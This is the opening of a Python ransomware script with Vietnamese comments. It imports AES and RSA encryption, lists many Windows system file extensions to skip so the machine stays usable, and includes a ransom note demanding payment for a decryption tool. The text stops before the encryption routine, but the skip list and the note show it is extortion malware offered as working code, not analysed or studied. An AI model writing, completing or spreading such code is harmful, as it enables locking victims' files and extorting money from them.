import os, shutil
from pathlib import Path
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Danh sách extension KHÔNG được đụng tới (rất nên mở rộng thêm)
SKIP_EXTENSIONS = {
    '.exe', '.dll', '.sys', '.msi', '.lnk', '.ocx', '.scr', '.cpl', '.drv',
    '.bat', '.cmd', '.ps1', '.vbs', '.js', '.hta', '.mui', '.cat', '.inf',
    '.ini', '.manifest', 'NTUSER.DAT', '.boot.ini', 'bootfont.bin', 'ntldr',
    '.autorun.inf', 'desktop.ini', '.iconcache.db', 'Thumbs.db', '.nomedia',
    '.ttf', '.otf', '.fon', '.cur', '.ani', '.msstyles',
    '.deskthemepack', '.themepack', '.tmp', '.temp', '.msc', '.rtp', '.msu',
    '.idx', '.key', '.pub', '.cab', '.url', '.vsix', '.py', '.pyd', '.rdp',
    '.386', '.wtfu',
    # Thêm rất nhiều nữa nếu muốn an toàn hơn
    '.log', '.evtx', '.etl', '.mum', '.manifest', '.sdb', '.pdb', '.ilk',
    '.idb', '.exp', '.lib', '.obj', '.pch', '.res', '.rsp', '.tlb', '.tlh',
    '.tli', '.trc', '.wpj', '.sln', '.suo', '.user', '.aps', '.ncb', '.opt',
    '.plg', '.positions', '.sdf', '.opensdf', '.VC.db', '.VC.VC.opendb',
    # Hệ thống Windows cực kỳ quan trọng
    '.sys', '.mui', '.cat', '.dll', '.exe', '.scr', '.cpl', '.drv',
    'pagefile.sys', 'hiberfil.sys', 'swapfile.sys'
}


RANSOM_NOTE = """
ATTENTION!

Don't worry, you can return all your files!
All your files like pictures, databases, documents and other important are encrypted with strongest encryption and unique key.
The only method of recovering files is to purchase decrypt tool and unique key for you.
